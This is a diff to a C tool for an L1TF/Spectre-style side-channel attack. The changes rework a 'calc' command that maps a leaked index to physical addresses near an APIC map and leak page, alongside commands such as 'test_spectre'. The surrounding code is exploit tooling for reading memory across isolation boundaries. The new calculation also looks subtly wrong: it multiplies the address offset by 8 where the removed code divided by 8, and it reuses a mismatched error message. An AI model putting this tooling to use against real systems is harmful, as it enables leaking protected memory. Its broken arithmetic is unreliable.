@@ -18,15 +18,6 @@
 #include "l1tf.h"
 #include "time_deque.h"
 
-size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
-  // It is below the phys_map, and thus unreachable
-  if (phys_page_addr < phys_map_addr) {
-    return 0;
-  }
-
-  return (phys_page_addr - phys_map_addr) / 8;
-}
-
 enum half_spectre_method {
   METHOD_IPI,
   METHOD_YIELD,
@@ -171,27 +162,43 @@ void cmd_determine(void *leak_page) {
   *(uint64_t *)leak_page = old_page_value;
 }
 
-void cmd_calc_min(int argc, char *argv[argc]) {
-  if (argc <= 3) {
+void cmd_calc(int argc, char *argv[argc]) {
+  if (argc < 2) {
     errno = EINVAL;
-    err(errno, "missing args, requires [leak page addr] [apic map addr]");
+    err(EXIT_FAILURE, "missing args, requires [lowest min index with a hit] [physical address of hit page] "
+                      "(physical address you want to know the address of)");
   }
+
   char *endptr = NULL;
-  uintptr_t leak_page_addr = strtoull(argv[2], &endptr, 16);
-  if (endptr == argv[2]) {
-    errno = EINVAL;
-    err(errno, "Could not parse phys addr of leak page");
+  size_t min = strtoull(argv[0], &endptr, 16);
+  if (endptr == argv[0]) {
+    err(EXIT_FAILURE, "Could not parse min index");
   }
 
-  uintptr_t apic_map_addr = strtoull(argv[3], &endptr, 16);
-  if (endptr == argv[3]) {
-    errno = EINVAL;
-    err(errno, "Could not parse phys addr of apic map");
+  uintptr_t phys_addr = strtoull(argv[1], &endptr, 16);
+  if (endptr == argv[1]) {
+    err(EXIT_FAILURE, "Could not parse physical address of hit page");
   }
 
-  printf("Leak page addr: %lx\tAPIC map addr: %lx\n", leak_page_addr, apic_map_addr);
-  size_t min = calculate_min(leak_page_addr, apic_map_addr);
-  printf("Min: %ld (or 0x%lx)\n", min, min);
+  printf("Leaked index 0x%lx is at 0x%lx\n", min, phys_addr);
+
+  uintptr_t phys_addr_of_array_start = phys_addr - (min * 8);
+  printf("Therefore, index 0x0 is at 0x%lx\n", phys_addr_of_array_start);
+
+  if (argc >= 3) {
+    uintptr_t requested_phys_addr = strtoull(argv[2], &endptr, 16);
+    if (endptr == argv[2]) {
+      err(EXIT_FAILURE, "Could not parse physical address of hit page");
+    }
+
+    if (requested_phys_addr < phys_addr_of_array_start) {
+      errno = ERANGE;
+      err(EXIT_FAILURE, "Requested physical address lays before the array");
+    }
+
+    size_t requested_index = (requested_phys_addr - phys_addr_of_array_start) * 8;
+    printf("Requested physical address is at index 0x%lx\n", requested_index);
+  }
 }
 
 void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
@@ -202,14 +209,12 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   char *endptr = NULL;
   uintptr_t min = strtoull(argv[2], &endptr, 16);
   if (endptr == argv[2]) {
-    errno = EINVAL;
-    err(errno, "Could not parse min");
+    err(EXIT_FAILURE, "Could not parse min");
   }
 
   uintptr_t iterations = strtoull(argv[3], &endptr, 10);
   if (endptr == argv[3]) {
-    errno = EINVAL;
-    err(errno, "Could not parse iterations");
+    err(EXIT_FAILURE, "Could not parse iterations");
   }
 
   printf("Doing %ld iterations\n", iterations);
@@ -228,7 +233,6 @@ void cmd_access_min(int argc, char *argv[argc]) {
   char *endptr = NULL;
   uintptr_t min = strtoull(argv[2], &endptr, 16);
   if (endptr == argv[2]) {
-    errno = EINVAL;
     err(EXIT_FAILURE, "Could not parse min");
   }
 
@@ -298,7 +302,7 @@ int main(int argc, char *argv[argc]) {
   if (!strcmp(argv[1], "determine")) {
     cmd_determine(leak_page);
   } else if (!strcmp(argv[1], "calc")) {
-    cmd_calc_min(argc, argv);
+    cmd_calc(argc - 2, &argv[2]);
   } else if (!strcmp(argv[1], "test_spectre")) {
     cmd_test_spectre(argc, argv, leak_page);
   } else if (!strcmp(argv[1], "access_min")) {
